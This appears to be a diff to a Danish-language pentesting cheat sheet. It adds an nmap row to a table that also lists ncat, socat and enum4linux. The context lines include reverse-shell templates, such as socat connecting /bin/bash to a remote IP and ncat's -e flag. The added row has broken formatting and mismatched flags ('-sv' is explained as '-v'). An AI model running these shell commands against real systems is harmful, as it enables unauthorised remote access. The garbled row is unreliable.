@@ -18,6 +18,7 @@
 | `ncat [host] [port]`        | Forbedret udgave af Netcat med bl.a. SSL-understøttelse og avancerede features. | `-l`: Lytter.<br>`-v`: Verbose.<br>`--ssl`: Bruger SSL-forbindelse.<br>`-e [program]`: Udfører program/shell ved forbindelse (typisk til reverse shells). |
 | `socat [parametre]`         | Avanceret værktøj til netværksoperationer, tunneling og shells. | Eksempel reverse shell:<br>`socat TCP-L:[port] -` (lyt)<br>`socat TCP:[ip]:[port] EXEC:/bin/bash` (connect til remote shell). |
 | `nmap -sV -sC <ip>`         | Scanner åbne porte, services og udfører standard scripts.                 | `-sV`: Version detection (service/version).<br>`-sC`: Kører standard NSE-scripts.  |
+| `nmap -sC -sv <ip>`         | Scanner åbne porte, services og udfører standard scripts.                 | -sC`: Kører standard NSE-scripts. `-v`: Aktivere verbose mode som giver detaljeret information.<br>`  |
 | `enum4linux <ip>`           | Udfører SMB/Samba enumeration (brugerinfo, shares).                       | Ingen nødvendige flags (standard scan).                       |
 
 
